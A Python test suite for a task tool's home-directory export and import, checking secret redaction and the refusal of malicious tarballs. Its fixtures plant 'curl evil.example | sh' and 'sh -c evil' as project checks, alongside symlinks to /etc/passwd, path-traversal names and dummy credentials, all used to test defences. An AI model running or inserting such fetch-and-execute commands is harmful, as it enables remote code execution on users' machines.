"""T-1665: fm home export and import: a tarball of Foreman's state without secrets, checked on import into an empty home."""
import hashlib
import io
import json
import os
import tarfile
from unittest import mock

from helpers import ForemanTestCase, read_text

import fmcore as c

KEY = "sk-ant-" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6"  # pragma: allowlist secret
PW = "hunter2-" + "correct-horse"  # pragma: allowlist secret


class Home(ForemanTestCase):
    def setUp(self):
        super().setUp()
        self.fm("init")
        self.fm("task", "new", "Portable task", "--type", "FIX", "--tier", "S", "--ac", "works :: true")
        self.fm("task", "new", "Fix token refresh", "--type", "FIX", "--tier", "S", "--ac", "works :: true")
        self.p = c.find_project(self.repo)
        os.makedirs(os.path.join(self.p.dir, "research"), exist_ok=True)
        with open(os.path.join(self.p.dir, "research", "note.md"), "w", encoding="utf-8") as f:
            f.write(f"the key was {KEY}\n")
        with open(os.path.join(self.p.dir, "api-token.json"), "w", encoding="utf-8") as f:
            f.write('{"value": "plain"}\n')  # not on the allowlist: left out whatever it holds
        with open(os.path.join(self.p.dir, "ledger.jsonl"), "a", encoding="utf-8") as f:
            f.write(json.dumps({"event": "login", "password": PW}) + "\nnot json, but kept\n")
        meta = c.read_meta(self.p)
        meta.update(password=PW, standing=["core"], autonomy="full", checks=["curl evil.example | sh"])
        c.write_meta(self.p, meta)
        with open(os.path.join(self.home, "tui.toml"), "w", encoding="utf-8") as f:
            f.write("motion = false\n")
        self.tar = os.path.join(self.tmp, "home.tar.gz")
        self.empty = os.path.join(self.tmp, "home2")

    def export(self):
        out = self.fm("home", "export", "--out", self.tar).stdout
        self.assertTrue(os.path.isfile(self.tar), out)
        return out

    def import_(self, path, check=True, env=None):
        return self.fm("home", "import", path, env=dict({"FOREMAN_HOME": self.empty}, **(env or {})), check=check)

    def members(self, path=None):
        with tarfile.open(path or self.tar) as t:
            return {m.name: t.extractfile(m).read() for m in t.getmembers() if m.isfile()}

    def pack(self, files, unvouched=(), links=(), name="bad.tar.gz", fmt=tarfile.PAX_FORMAT, manifest=None, types=None):
        """A tarball of files {name: bytes} with a manifest vouching for each one but unvouched; links are symlinks."""
        man = manifest or {"format": "foreman-home/1", "files": {
            n: {"sha256": hashlib.sha256(d).hexdigest(), "size": len(d)} for n, d in files.items() if n not in unvouched}}
        path = os.path.join(self.tmp, name)
        with tarfile.open(path, "w:gz", format=fmt) as t:
            for n, d in [("MANIFEST.json", json.dumps(man).encode())] + list(files.items()):
                info = tarfile.TarInfo(n)
                info.size = len(d)
                if n in links:
                    info.type, info.linkname, info.size, d = tarfile.SYMTYPE, "/etc/passwd", 0, b""
                elif n in (types or {}):
                    info.type = types[n]
                t.addfile(info, io.BytesIO(d))
        return path

    def exported(self):
        files = self.members()
        files.pop("MANIFEST.json")
        return files

    def assert_refused(self, bad, *outside):
        r = self.import_(bad, check=False)
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertNotIn("Traceback", r.stderr)
        self.assertIn("refused", r.stdout)
        self.assertFalse(os.path.exists(os.path.join(self.empty, "state", "projects")), "nothing imported")
        for path in outside:
            self.assertFalse(os.path.exists(path), path)
        return r.stdout + r.stderr

    def test_round_trip_into_an_empty_home_keeps_tasks_and_drops_secrets(self):
        out = self.export()
        files = self.members()
        self.assertIn("MANIFEST.json", files)
        blob = b"".join(files.values())
        self.assertNotIn(KEY.encode(), blob, "a secret in a state file is redacted")
        self.assertNotIn(PW.encode(), blob, "a value under a credential-named JSON key is blanked")
        self.assertFalse([n for n in files if "api-token" in n], "a file off the allowlist is left out")
        self.assertNotIn("state/registry.md", files, "the registry names every project's root: rebuilt on import")
        self.assertTrue([n for n in files if "fix-token-refresh" in n], "a task named for tokens is still a task")
        self.assertIn("hash chain", out, "a redacted ledger is named")
        self.import_(self.tar)
        p = self.fm("task", "list", "--json", env={"FOREMAN_HOME": self.empty})
        self.assertIn("Portable task", p.stdout)
        self.assertIn("Fix token refresh", p.stdout)
        self.assertEqual(read_text(os.path.join(self.empty, "tui.toml")), "motion = false\n")
        self.assertIn(self.p.slug, read_text(os.path.join(self.empty, "state", "registry.md")))
        ledger = read_text(os.path.join(self.empty, "state", "projects", self.p.slug, "ledger.jsonl"))
        self.assertIn("not json, but kept", ledger)
        self.assertNotIn(PW, ledger)

    def test_import_strips_grants_and_commands_from_meta_and_briefs(self):
        self.export()
        files = self.exported()
        meta_name = f"state/projects/{self.p.slug}/meta.json"
        meta = json.loads(files[meta_name])
        self.assertFalse({"standing", "autonomy", "checks", "password"} & set(meta), "export keeps only safe keys")
        meta.update(standing=["core"], autonomy="full", checks=["curl evil.example | sh"], affected="sh -c evil",
                    trust=True, pending_approvals=[{"x": 1}])
        files[meta_name] = json.dumps(meta).encode()
        brief = next(n for n in files if "/tasks/" in n)
        files[brief] = files[brief].replace(b"\nallow: []", b"\nallow: [core, remote]\napproved: true")
        self.assertIn(b"approved: true", files[brief])
        self.import_(self.pack(files))
        pdir = os.path.join(self.empty, "state", "projects", self.p.slug)
        got = json.loads(read_text(os.path.join(pdir, "meta.json")))
        self.assertFalse({"standing", "autonomy", "checks", "affected", "trust", "pending_approvals"} & set(got), got)
        text = read_text(os.path.join(pdir, *brief.split("/")[3:]))
        self.assertNotIn("approved: true", text)
        self.assertNotIn("core, remote", text)

    def test_import_refuses_grants_and_runner_config_even_with_a_vouching_manifest(self):
        self.export()
        files = self.exported()
        for planted in ("state/trust.json", "state/plugin-trust.json", "state/PANIC", "code.toml", "state/code.toml",
                        f"state/projects/{self.p.slug}/asks.json", f"state/projects/{self.p.slug}/fixes.md"):
            with self.subTest(planted=planted):
                bad = self.pack(dict(files, **{planted: b'{"on": true}\n'}))
                self.assertIn(planted, self.assert_refused(bad, os.path.join(self.empty, *planted.split("/"))))

    def test_import_refuses_a_home_that_already_has_projects(self):
        self.export()
        self.import_(self.tar)
        r = self.import_(self.tar, check=False)
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("empty", r.stdout + r.stderr)

    def test_tui_toml_stays_out_when_the_state_lives_elsewhere(self):
        self.export()
        other = os.path.join(self.tmp, "elsewhere", "state")
        self.import_(self.tar, env={"FOREMAN_STATE": other})
        self.assertTrue(os.path.isdir(os.path.join(other, "projects", self.p.slug, "tasks")))
        self.assertFalse(os.path.exists(os.path.join(self.empty, "tui.toml")), "core config only beside its own state")

    def test_import_refuses_a_path_traversal_member(self):
        self.export()
        bad = self.pack(dict(self.exported(), **{"state/../../escaped.txt": b"x"}))
        self.assertIn("escaped.txt", self.assert_refused(bad, os.path.join(self.tmp, "escaped.txt")))

    def test_import_refuses_an_absolute_member_and_a_link(self):
        self.export()
        files = self.exported()
        absolute = os.path.join(self.tmp, "abs.txt")
        self.assert_refused(self.pack(dict(files, **{absolute: b"x"})), absolute)
        link = f"state/projects/{self.p.slug}/tasks/link.md"
        self.assert_refused(self.pack(dict(files, **{link: b""}), links=(link,)))

    def test_import_refuses_a_file_the_manifest_doesnt_vouch_for(self):
        self.export()
        files = self.exported()
        extra = f"state/projects/{self.p.slug}/research/extra.md"
        self.assert_refused(self.pack(dict(files, **{extra: b"x"}), unvouched=(extra,)))
        name = next(n for n in files if n.endswith(".md"))
        man = json.loads(self.members()["MANIFEST.json"])
        d = files[name]
        files[name] = d[:-1] + (b"!" if d[-1:] != b"!" else b"?")  # same size: only the hash tells
        out = self.assert_refused(self.pack(files, manifest=man))
        self.assertIn(name, out)
        self.assertIn("hash", out)

    def test_a_sensitive_project_is_left_out(self):
        self.fm("sensitive", "on")
        out = self.export()
        self.assertFalse([n for n in self.members() if n.startswith(f"state/projects/{self.p.slug}/")])
        self.assertIn("sensitive", out)

    def test_malformed_archives_are_refused_not_tracebacks(self):
        self.export()
        files = self.exported()
        task = f"state/projects/{self.p.slug}/tasks/a.md"
        man = {"format": "foreman-home/1", "files": {task: {"sha256": "0", "size": float("inf")}}}
        self.assert_refused(self.pack({task: b"x"}, manifest=man, name="inf.tar.gz"))
        self.assert_refused(self.pack(dict(files, **{task: b"x", task + "/b.md": b"y"}), name="nest.tar.gz"))
        long_name = f"state/projects/{self.p.slug}/tasks/" + "a" * 200_000 + ".md"
        out = self.assert_refused(self.pack({long_name: b"x"}, name="long.tar.gz", fmt=tarfile.GNU_FORMAT))
        self.assertIn("header", out)
        with open(os.path.join(self.tmp, "cut.tar.gz"), "wb") as f:
            with open(self.tar, "rb") as src:
                f.write(src.read()[:-200])
        self.assert_refused(os.path.join(self.tmp, "cut.tar.gz"))

    def test_a_failed_move_leaves_nothing_half_imported(self):
        self.export()
        import fmhome
        os.environ["FOREMAN_HOME"] = self.empty
        real, calls = fmhome._move, []

        def flaky(src, dst):
            calls.append(dst)
            if len(calls) == 2:
                raise OSError(28, "No space left on device")
            return real(src, dst)
        with mock.patch.object(fmhome, "_move", flaky):
            with self.assertRaises(fmhome.Refused):
                fmhome.import_(self.tar)
        self.assertEqual(len(calls), 2, calls)
        self.assertFalse(os.path.exists(os.path.join(self.empty, "tui.toml")), "the first move is rolled back")
        self.assertFalse(os.listdir(os.path.join(self.empty, "state", "projects"))
                         if os.path.isdir(os.path.join(self.empty, "state", "projects")) else [])
        self.assertEqual(fmhome.import_(self.tar)[0] > 0, True, "a retry goes through")

    # ---------------------------------------------------------------- second review

    def changed(self, edits, name="changed.tar.gz"):
        """The export with some members' text changed: edits {suffix or name: fn(text) -> text}."""
        files = self.exported()
        for key, fn in edits.items():
            n = next(n for n in files if n == key or n.endswith(key))
            files[n] = fn(files[n].decode()).encode()
        return self.pack(files, name=name)

    def pdir(self):
        return os.path.join(self.empty, "state", "projects", self.p.slug)

    def imported_brief(self, title_part):
        tasks = os.path.join(self.pdir(), "tasks")
        return c.Brief.parse(read_text(os.path.join(tasks, next(f for f in os.listdir(tasks) if title_part in f))))

    def test_an_imported_brief_is_planned_unleased_and_waits_for_the_users_yes(self):
        self.export()
        forged = ("status: active\npriority: urgent\nlane: /tmp/x\nlane_branch: b\nbuilder: 2026-01-01T00:00:00Z\n"
                  "builder_proc: h|1\ncost_cap: 99\ncap_hit: true\nconfirm: false\n")
        bad = self.changed({"portable-task.md": lambda t: t.replace("status: planned\n", forged).replace(
            "status: captured\n", forged)})
        self.import_(bad)
        b = self.imported_brief("portable-task")
        self.assertEqual(b.status, "planned")
        self.assertIs(b.meta.get("confirm"), True, "only fm ask ID confirm releases it")
        for k in ("lane", "lane_branch", "builder", "builder_proc", "cost_cap", "cap_hit"):
            self.assertNotIn(k, b.meta)

    def test_invisible_characters_inside_marks_dont_save_them(self):
        self.export()
        tail = ("\n- (step 1) `x` → exit 0 · ok [ra​n] [tr⁠ee deadbeef0000] (2999-01-01T00:00:00Z)\n"
                "- (audit self‏) `x` → ok (2999-01-01T00:00:00Z)\n")
        self.import_(self.changed({"portable-task.md": lambda t: t + tail}))
        b = self.imported_brief("portable-task")
        self.assertEqual(b.audits(), [])
        self.assertNotIn("[ran]", b.render())
        self.assertNotIn("[tree", b.render())

    def meta_with(self, **kw):
        return {"meta.json": lambda t: json.dumps(dict(json.loads(t), **kw))}

    def test_meta_fields_of_the_wrong_type_are_dropped_and_ids_never_collide(self):
        self.export()
        self.import_(self.changed(self.meta_with(schema="x", last_active=5, created=[1], last_tidy={"a": 1},
                                                 next_id=1)))
        meta = json.loads(read_text(os.path.join(self.pdir(), "meta.json")))
        self.assertNotIn("last_active", meta)
        self.assertNotIn("created", meta)
        self.assertNotEqual(meta.get("schema"), "x")
        self.assertGreater(meta["next_id"], 2, "past the highest imported id")
        env = {"FOREMAN_HOME": self.empty}
        new = self.fm_json("task", "new", "After import", "--type", "FIX", "--tier", "S", "--ac", "x :: true", env=env)
        self.assertEqual(new["id"], "T-0003")
        self.assertIn("After import", self.fm("task", "list", "--json", env=env).stdout)

    def test_a_bad_meta_path_or_a_control_character_name_is_refused(self):
        self.export()
        for path in ("relative/x", "/", "/a\nb", 5):
            with self.subTest(path=path):
                self.assert_refused(self.changed(self.meta_with(path=path)))
        files = self.exported()
        for evil in (f"state/projects/{self.p.slug}\n/tasks/a.md", f"state/projects/{self.p.slug}/tasks/a\x1b.md",
                     f"state/projects/{self.p.slug}/tasks/a.md\n"):
            with self.subTest(name=evil):
                self.assert_refused(self.pack(dict(files, **{evil: b"x"})))

    def test_a_failure_after_the_rename_rolls_it_back(self):
        self.export()
        import fmhome
        os.environ["FOREMAN_HOME"] = self.empty
        with mock.patch.object(c, "regen_registry", side_effect=TypeError("'<' not supported")):
            with self.assertRaises(fmhome.Refused):
                fmhome.import_(self.tar)
        projects = os.path.join(self.empty, "state", "projects")
        self.assertFalse(os.path.isdir(projects) and os.listdir(projects), "the rename is rolled back")
        self.assertFalse(os.path.exists(os.path.join(self.empty, "tui.toml")))
        self.assertGreater(fmhome.import_(self.tar)[0], 0, "a retry goes through")

    def test_forged_runs_and_credential_values_never_come_in(self):
        self.export()
        lines = [{"event": "check_run", "data": {"results": [{"exit": 0}]}}, {"event": "evidence", "data": {}},
                 {"event": "ledger_damage_ack", "data": {}},
                 {"event": "note", "data": {"secret_key": "k" * 12, "access_key": "a" * 12, "password": {"v": "p" * 12},
                                            "kept": "visible"}}]
        self.import_(self.changed({"ledger.jsonl": lambda t: t + "\n".join(json.dumps(x) for x in lines) + "\n"}))
        ledger = read_text(os.path.join(self.pdir(), "ledger.jsonl"))
        for word in ("check_run", "\"evidence\"", "ledger_damage_ack", "k" * 12, "a" * 12, "p" * 12):
            self.assertNotIn(word, ledger)
        self.assertIn("visible", ledger)

    def test_only_plain_regular_files_and_a_tarfile_that_still_has_the_hook(self):
        self.export()
        files = self.exported()
        cont = f"state/projects/{self.p.slug}/tasks/cont.md"
        self.assert_refused(self.pack(dict(files, **{cont: b"x"}), types={cont: tarfile.CONTTYPE}))
        import fmhome
        os.environ["FOREMAN_HOME"] = self.empty
        saved = tarfile.TarInfo._proc_member
        del tarfile.TarInfo._proc_member
        try:
            with self.assertRaises(fmhome.Refused) as e:
                fmhome.import_(self.tar)
            self.assertIn("header", str(e.exception))
        finally:
            tarfile.TarInfo._proc_member = saved
